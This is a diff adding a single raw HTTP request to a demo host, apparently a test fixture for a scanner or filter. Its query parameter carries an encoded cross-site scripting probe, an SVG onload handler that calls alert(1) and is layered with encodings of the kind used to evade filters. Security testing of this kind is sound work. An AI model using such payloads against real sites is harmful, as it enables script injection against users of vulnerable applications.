@@ -1,0 +1,4 @@
+GET /a?url=%26lt;svg/onload%3Dalert(1)%26gt; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
